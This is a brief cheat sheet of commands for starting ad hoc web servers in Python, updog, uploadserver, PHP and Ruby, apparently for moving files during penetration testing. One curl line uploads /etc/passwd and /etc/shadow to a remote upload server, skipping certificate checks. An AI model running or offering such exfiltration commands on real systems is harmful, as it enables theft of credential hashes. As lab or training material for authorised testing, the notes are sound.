# Personal web server

### Python

```bash
python3 -m http.server 8080
```

### Updog

```
updog -d $(echo $(pwd)/) -p 80
```

### uploadserver

```shell-session
sudo python3 -m pip install --user uploadserver
```

* make it secure

```shell-session
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

```shell-session
mkdir https && cd https
```

```shell-session
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

**Linux - Upload Multiple Files**

```shell-session
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

* We used the option `--insecure` because we used a self-signed certificate that we trust.

### Linux - Creating a Web Server with PHP

```shell-session
php -S 0.0.0.0:8000
```

### Linux - Creating a Web Server with Ruby

```shell-session
ruby -run -ehttpd . -p8000
```

## References

* [https://realpython.com/python-http-server/](https://realpython.com/python-http-server/)
